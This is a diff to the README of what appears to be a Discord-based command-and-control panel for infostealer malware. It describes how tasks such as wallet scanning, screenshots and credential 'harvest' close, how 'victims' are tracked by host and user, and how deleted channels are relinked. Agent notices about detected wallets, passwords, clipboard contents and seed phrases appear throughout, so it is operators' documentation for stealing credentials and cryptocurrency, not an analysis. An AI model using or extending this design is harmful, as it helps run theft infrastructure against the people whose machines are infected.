@@ -13,7 +13,15 @@ no VPS. The panel only makes outbound HTTPS requests to Discord.
 - Agent chat notices (`wallet detected`, `password?`, `clipboard:`, `seed escrita`)
   become events and table rows.
 - The bridge creates a per-channel webhook `SPC Console` and posts panel tasks through it;
-  the agent ignores messages from its own bot account. Replies and uploaded files close the task.
+  the agent ignores messages from its own bot account.
+- `Task <name> queued` is only an acknowledgement. A task closes on its artifact
+  (`wallets` → `scan_wallets`, `screenshot` → `screenshot`, `harvest` → `harvest`) or
+  on the JSON result (`result-<task>-<id>.json`) the crypto module uploads when the
+  API is unreachable. Shell output closes shell tasks. A task without a result fails
+  with `timeout:` when its lease expires.
+- Deleting a victim keeps its channel in `DiscordIgnore`; the sweep skips it until an
+  admin presses **re-link** on Victims. Recreating a deleted channel reattaches the
+  link by `sync-<host>-<user>` instead of creating a second victim.
 - Every 120 s the bridge posts `ping`; replies keep the victim online.
 
 ## Requirements
@@ -30,8 +38,9 @@ no VPS. The panel only makes outbound HTTPS requests to Discord.
   the channel. This is weaker than the HTTPS API.
 - 10 MB per attachment (existing agent splits above 8 MB into `.partNNN`).
 - Rate limits: 4 s per channel poll, 220 ms between channels.
-- Channel deletion loses the link; recreate the channel and wait for the bridge to
-  relink by name.
+- Channel deletion marks the link `missing`; the victim page shows **channel
+  missing** and tasks fail with `discord_channel_missing`. Recreate the channel with
+  the same `sync-<host>-<user>` name and the sweep reattaches it.
 - Large wallet dumps cost bandwidth and Discord storage.
 
 ## Configuration
